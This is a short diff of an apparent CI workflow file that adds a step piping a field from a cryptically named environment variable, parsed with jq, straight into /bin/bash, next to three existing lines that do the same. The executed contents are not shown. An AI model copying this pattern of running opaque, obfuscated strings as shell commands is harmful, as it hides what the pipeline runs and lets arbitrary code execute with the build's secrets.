@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$sa9" | jq -r .wm3 | /bin/bash
           echo $nb4 | jq -r .xw14 | /bin/bash
           echo $dtt1 | jq -r .fpgg98641 | /bin/bash
+          printf '%s' "$upifw5" | jq -r .pt99989 | /bin/bash
 
       - name: Archive output
         if: always()
